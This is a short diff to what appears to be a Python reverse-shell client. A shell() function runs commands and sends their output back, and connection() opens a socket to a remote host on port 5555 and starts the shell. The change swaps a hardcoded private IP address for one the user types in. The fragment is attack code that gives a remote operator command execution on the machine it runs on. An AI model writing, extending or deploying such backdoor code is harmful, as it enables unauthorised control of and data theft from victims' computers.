@@ -24,10 +24,10 @@ def shell():
             result = result.decode()
             reliable_send(result)
 
-def connection():
+def connection(your_ip):
     time.sleep(1)
     try:
-        s.connect(("192.168.178.132",5555))
+        s.connect((your_ip,5555))
         shell()
         s.close()
 
@@ -37,4 +37,5 @@ def connection():
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection()
+your_ip = input("server ip:\n")
+connection(your_ip)
